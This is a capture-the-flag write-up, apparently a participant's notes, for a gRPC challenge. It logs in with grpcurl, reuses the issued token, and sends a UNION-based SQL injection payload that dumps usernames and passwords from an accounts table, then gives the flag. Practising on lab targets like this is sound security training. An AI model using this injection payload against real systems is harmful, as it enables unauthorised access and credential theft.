

Figure out what the cat does when it is parked in reverse!

[http://kicyber2024-58413b785268-rpc1-0.chals.io](http://kicyber2024-58413b785268-rpc1-0.chals.io/)  
`nc 0.cloud.chals.io 11786`  
`nc 0.cloud.chals.io 12188`

![[Pasted image 20240811045456.png]]



Install golang first 


![[Pasted image 20240811042449.png]]

```shell

grpcurl -d 'username: "dkvv", password: "dkvv"' -plaintext -format text 0.cloud.chals.io:11414 SimpleApp.LoginUser

```
![[Pasted image 20240811042537.png]]



```shell 
grpcurl -v -d 'username: "dkvv", password: "dkvv"' -plaintext -format text 0.cloud.chals.io:11414  SimpleApp.LoginUser

```


![[Pasted image 20240811042731.png]]

Token 
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZGt2diIsImV4cCI6MTcyMzM0MDY0Mn0.0ZRIqTayBAQfjUabNqaibgRpPPSK0KyFXcH18C-5cPw
```

Then used the following command

```shell

grpcurl -d 'id: "320 union select group_concat(username || \":\" || password ) from accounts"' -H "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZGt2diIsImV4cCI6MTcyMzM0MDY0Mn0.0ZRIqTayBAQfjUabNqaibgRpPPSK0KyFXcH18C-5cPw" -plaintext -format text 0.cloud.chals.io:11414 SimpleApp.getInfo
message: "admin:admin,anish_mitra:KPMG_s3cret_pa55w07d_123,dkvv:dkvv"
```

![[Pasted image 20240811044156.png]]

![[Pasted image 20240811044406.png]]


The flag is
`KPMG_CTF{RaoGJ8Ahgzy35xOVgesBs1UR02LsFodAPaXc2GEXLYb1UQjck5G0rkbev4jax6F-qDYnuA6f-YO6KBPPX8TESJlkIUZZQyy1jSMgG7uO}`

